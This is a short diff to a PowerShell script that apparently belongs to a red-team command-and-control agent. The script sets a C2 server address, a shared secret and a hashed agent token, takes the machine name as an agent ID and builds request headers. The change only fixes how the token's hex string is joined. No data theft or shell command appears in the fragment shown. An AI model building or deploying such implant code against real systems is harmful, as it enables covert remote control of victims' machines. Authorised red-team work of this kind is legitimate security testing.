@@ -2,9 +2,9 @@
 
 $C2      = "https://100.65.4.238"
 $Secret  = "foxtrot-redteam-2026"
-$Token   = [System.Security.Cryptography.SHA256]::Create().ComputeHash(
+$Token   = -join ([System.Security.Cryptography.SHA256]::Create().ComputeHash(
                [System.Text.Encoding]::UTF8.GetBytes($Secret)
-           ) | ForEach-Object { $_.ToString("x2") } | Join-String
+           ) | ForEach-Object { $_.ToString("x2") })
 
 $AgentId = $env:COMPUTERNAME
 $Headers = @{ "X-Agent-Token" = $Token; "Content-Type" = "application/json" }
